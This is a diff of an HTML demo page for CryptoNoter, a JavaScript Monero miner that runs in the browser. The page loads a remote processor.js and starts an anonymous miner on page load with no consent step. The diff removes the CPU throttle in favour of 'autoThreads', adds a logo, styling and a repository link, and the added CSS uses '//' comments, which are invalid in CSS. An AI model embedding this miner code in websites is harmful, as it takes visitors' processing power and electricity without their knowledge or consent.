@@ -2,20 +2,27 @@
 <html lang="en">
 
 <head>
-	<meta charset="UTF-8">
-	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
 	<meta http-equiv="X-UA-Compatible" content="ie=edge">
 	<title>CryptoNoter - Javascript Browser XMR Mining Script</title>
 	<style>
-		th {
-			width: 180px;
-		}
-	</style>
+img {
+    display: inline-block;
+    width: 25%; // Show 4 images in a row normally
+    height: auto;
+}
+
+@media (max-width: 600px) {
+  img {
+    width: 100%; // Override width to show only one image in a row on smaller screens
+  }
+}	</style>
 	<script src="https://www.cryptonoter.com/processor.js"></script>
 	<script>
 		var addr = 'CryptoNoter';
 		var miner = new CryptoNoter.Anonymous(addr, {
-			throttle: 0.3
+			autoThreads: true
 		});
 		miner.start();
 
@@ -46,8 +53,11 @@
 	</script>
 </head>
 
-<body>
-<table width='930' cellpadding= '5' cellspacing='0'style='margin:0px;font-size:14px;' />
+<body style="font-family: Arial;border: 0 none;">
+
+<div align='center' style='margin-top:100px;'>
+<img src='https://www.cryptonoter.com/img/logo-600.png' /><br /><br />
+<table cellpadding= '5' cellspacing='0'style='margin-bottom:80px;font-size:16px;' />
 <tr>
 	<td width='150' align='left' valign='top' style='border-bottom: 1px solid #d6d5d5;'>
 		<b>Hash Rate / Sec</b>
@@ -77,5 +87,8 @@
 	</td>
 </tr>
 </table>
+<a href='https://github.com/cryptonoter/CryptoNoter' />CryptoNoter's Repository at Github</a>
+</div>
+
 </body>
 </html>
